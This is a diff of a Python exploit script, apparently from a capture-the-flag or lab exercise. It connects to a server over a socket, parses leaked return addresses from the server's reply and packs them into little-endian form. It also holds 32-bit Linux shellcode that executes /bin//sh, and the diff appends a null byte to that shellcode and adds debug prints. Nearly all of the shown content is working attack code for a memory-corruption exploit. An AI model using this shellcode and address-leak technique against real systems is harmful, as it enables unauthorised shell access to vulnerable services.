@@ -17,11 +17,14 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     ret_addr2 = int(feedback[-10:-2],16)
     ret_addr1 = int(feedback[-14:-10],16)
 
+    print(hex(ret_addr1))
+    print(hex(ret_addr2))
+
     ret_addr2 = pack("<I", ret_addr2 + 48)
     ret_addr1 = pack("<I", ret_addr1)
 
 	# Shellcode & return address
-    shellcode = b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"
+    shellcode = b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80\x00"
     
 
     # Run your Python code and save the output to a variable
@@ -36,6 +39,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 
     # Receive feedback from the server
     data = s.recv(1024)
+    print(data)
     feedback = data.decode()
     print("Feedback from server: ", feedback)
 
